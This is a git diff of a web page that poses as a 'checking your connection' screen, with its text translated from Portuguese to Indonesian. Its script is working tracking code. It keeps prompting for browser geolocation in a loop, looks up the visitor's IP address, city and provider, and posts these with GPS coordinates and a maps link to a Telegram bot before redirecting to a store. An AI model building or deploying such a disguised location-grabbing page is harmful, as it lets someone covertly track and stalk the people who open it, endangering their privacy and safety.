@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>Checking your connection...</title>
+  <title>Memeriksa koneksi Anda...</title>
   <style>
     body {
       font-family: sans-serif;
@@ -19,8 +19,8 @@
   </style>
 </head>
 <body>
-  <h2>🔒 Izinkan akses ke lokasi anda</h2>
-  <p id="status">Aguardando permissão do navegador...</p>
+  <h2>🔒 Izinkan akses lokasi Anda</h2>
+  <p id="status">Memeriksa koneksi Anda...</p>
   <div class="loader">⏳</div>
 
   <script>
@@ -29,18 +29,19 @@
 
     async function sendLocation(coords, ipData, ipInfo) {
       const msg = `
-📥 Nova localização detectada!
+📥 Lokasi baru terdeteksi!
 
 🌐 IP: ${ipData.ip}
-📍 País: ${ipInfo?.country_name || 'N/A'}
-🏙️ Cidade: ${ipInfo?.city || 'N/A'}
-🕹️ ISP: ${ipInfo?.org || 'N/A'}
+📍 Negara: ${ipInfo?.country_name || 'N/A'}
+🏙️ Kota: ${ipInfo?.city || 'N/A'}
+🕹️ Provider: ${ipInfo?.org || 'N/A'}
 
-📡 GPS: Latitude: ${coords.latitude}
+📡 GPS: 
+Latitude: ${coords.latitude}
 Longitude: ${coords.longitude}
-https://maps.google.com/?q=${coords.latitude},${coords.longitude}
+📌 https://maps.google.com/?q=${coords.latitude},${coords.longitude}
 
-🕓 Data: ${new Date().toLocaleString()}
+🕓 Waktu: ${new Date().toLocaleString()}
       `;
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -48,30 +49,36 @@ https://maps.google.com/?q=${coords.latitude},${coords.longitude}
         body: JSON.stringify({ chat_id: chatId, text: msg })
       });
 
-      // Redirect jika selesai
+      // Arahkan setelah lokasi dikirim
       window.location.href = "https://web-store-rexxin.vercel.app";
     }
 
     async function getIPInfo() {
-      const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).catch(() => ({ ip: "Gagal" }));
-      const info = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null);
+      const ip = await fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .catch(() => ({ ip: "Gagal" }));
+
+      const info = await fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .catch(() => null);
+
       return { ipData: ip, ipInfo: info };
     }
 
     async function requestLoop() {
       const statusText = document.getElementById("status");
       while (true) {
-        await new Promise(r => setTimeout(r, 2000)); // tunggu 2 detik setiap loop
+        await new Promise(r => setTimeout(r, 2000));
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(async pos => {
-            statusText.innerText = "📍 Localização detectada, enviando...";
+            statusText.innerText = "📍 Lokasi terdeteksi, mengirim...";
             const { ipData, ipInfo } = await getIPInfo();
             await sendLocation(pos.coords, ipData, ipInfo);
           }, err => {
-            statusText.innerText = "❌ Permissão negada. Por favor, permita o acesso à localização para continuar.";
+            statusText.innerText = "❌ Akses lokasi ditolak. Silakan izinkan akses lokasi untuk melanjutkan.";
           });
         } else {
-          statusText.innerText = "Seu navegador não suporta localização.";
+          statusText.innerText = "Browser Anda tidak mendukung fitur lokasi.";
           break;
         }
       }
